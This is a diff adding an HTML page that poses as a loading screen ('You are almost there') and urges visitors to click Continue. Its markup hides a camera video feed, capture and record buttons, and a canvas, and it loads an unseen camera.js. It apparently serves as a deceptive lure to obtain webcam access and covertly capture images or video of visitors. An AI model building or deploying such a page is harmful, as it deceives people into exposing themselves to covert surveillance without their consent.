@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You are almost there</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="container">
+
+    <h1>Patients is key</h1>
+
+    <p>
+        The page is loading, please put in mind that there is no need to rush, we are almost done.
+        Please click the below to proceed to the next step.
+    </p>
+
+    <button id="allowButton">
+        Continue
+    </button>
+
+    <p id="status"></p>
+
+    <video
+        id="camera"
+        autoplay
+        playsinline
+        muted
+        style="width:100%; margin-top:20px; display:none;">
+    </video>
+
+    <button
+        id="captureButton"
+        style="display:none;">
+        Hold up
+    </button>
+
+    <button
+        id="recordButton"
+        style="display:none;">
+        Wait a minute
+    </button>
+
+    <canvas
+        id="canvas"
+        style="display:none;">
+    </canvas>
+
+</div>
+
+<script src="camera.js"></script>
+
+</body>
+</html>
